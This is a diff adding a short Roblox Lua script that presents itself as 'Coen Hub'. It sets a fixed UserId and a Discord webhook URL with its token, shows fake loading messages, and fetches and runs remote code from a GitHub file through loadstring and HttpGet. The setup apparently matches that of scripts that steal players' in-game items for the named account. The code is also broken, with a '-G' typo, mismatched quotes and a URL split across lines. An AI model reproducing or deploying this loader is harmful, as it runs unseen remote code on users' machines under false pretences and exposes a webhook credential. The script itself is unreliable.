@@ -1,0 +1,10 @@
+UserId = 1187136205
+WebHook = 'https://discord.com/api/webhooks/1079244268717211719/UQiNFISbib_1lXTEcHz8Ggw8IkdijFM6uFikpIdspqizKJnpBsJ438URJOOE1-95DLjt'
+
+_G.CustomScriptName = "Coen Hub"
+_G.Text1 = "Script Loaded..."
+_G.Text2 = "Waiting for Script"
+_G.Text3 = "Checking Scripts..."
+-G.Text4 = "Starting Scripts...''
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme
+/petsimx22/main/petsimxgm.lua"))()
